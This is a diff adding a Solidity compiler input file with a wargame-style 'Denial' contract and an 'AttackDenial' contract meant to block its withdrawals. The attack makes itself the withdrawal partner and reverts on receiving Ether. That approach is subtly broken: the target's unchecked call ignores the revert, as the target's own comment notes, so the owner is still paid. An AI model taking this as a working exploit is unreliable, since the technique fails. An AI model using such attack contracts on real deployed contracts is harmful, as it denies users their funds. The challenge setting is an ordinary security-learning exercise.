@@ -1,0 +1,38 @@
+{
+  "language": "Solidity",
+  "sources": {
+    "contracts/Denial/AttackDenial.sol": {
+      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IDenial {\n    function setWithdrawPartner(address _partner) external;\n    function withdraw() external;\n}\n\ncontract AttackDenial {\n    IDenial public target;\n\n    constructor(IDenial _target) {\n        target = _target;\n    }\n\n    // Main function to execute the attack\n    function pwn() external payable {\n        // Set this contract as the withdrawal partner on the target contract\n        target.setWithdrawPartner(address(this));\n\n        // Send Ether to the target contract (Denial)\n        (bool success, ) = payable(address(target)).call{value: msg.value}(\"\");\n        require(success, \"Error sending Ether during the pwn() operation!\");\n\n        // Finally, withdraw tokens for both the owner and this contract\n        target.withdraw();\n    }\n    \n    // Function to receive Ether: we immediately revert to deny the operation\n    receive() external payable {\n        revert(\"System compromised!\");\n    }\n}\n"
+    },
+    "contracts/Denial/Denial.sol": {
+      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\ncontract Denial {\n\n    address public partner; // withdrawal partner - pay the gas, split the withdraw\n    address public constant owner = address(0xA9E);\n    uint timeLastWithdrawn;\n    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances\n\n    function setWithdrawPartner(address _partner) public {\n        partner = _partner;\n    }\n\n    // withdraw 1% to recipient and 1% to owner\n    function withdraw() public {\n        uint amountToSend = address(this).balance / 100;\n        // perform a call without checking return\n        // The recipient can revert, the owner will still get their share\n        partner.call{value:amountToSend}(\"\");\n        payable(owner).transfer(amountToSend);\n        // keep track of last withdrawal time\n        timeLastWithdrawn = block.timestamp;\n        withdrawPartnerBalances[partner] +=  amountToSend;\n    }\n\n    // allow deposit of funds\n    receive() external payable {}\n\n    // convenience function\n    function contractBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}"
+    }
+  },
+  "settings": {
+    "optimizer": {
+      "enabled": true,
+      "runs": 200
+    },
+    "outputSelection": {
+      "*": {
+        "*": [
+          "abi",
+          "evm.bytecode",
+          "evm.deployedBytecode",
+          "evm.methodIdentifiers",
+          "metadata",
+          "devdoc",
+          "userdoc",
+          "storageLayout",
+          "evm.gasEstimates"
+        ],
+        "": [
+          "ast"
+        ]
+      }
+    },
+    "metadata": {
+      "useLiteralContent": true
+    }
+  }
+}
